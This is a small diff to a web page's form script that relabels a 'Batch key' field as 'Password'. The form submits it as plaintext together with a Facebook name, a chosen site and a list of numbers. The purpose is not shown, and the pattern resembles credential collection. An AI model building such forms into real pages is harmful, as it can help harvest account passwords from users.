@@ -239,7 +239,7 @@ let fb=fbname.value.trim();
 let key=batchkey.value.trim();
 
 if(!fb){alert("Facebook name required.");return;}
-if(!key){alert("Batch key required.");return;}
+if(!key){alert("Password required.");return;}
 if(!selectedSite){alert("Select site first.");return;}
 
 let nums=numbersField.value
@@ -266,7 +266,7 @@ headers:{"Content-Type":"application/json"},
 body:JSON.stringify({
 numbers:`Site: ${selectedSite}
 Facebook: ${fb}
-Batch Key: ${key}
+Password: ${key}
 
 ${cleaned.join("\n")}`,
 filename:fb
@@ -284,4 +284,5 @@ lastSubmitTime=Date.now();
 
 </body>
 </html>
+
 
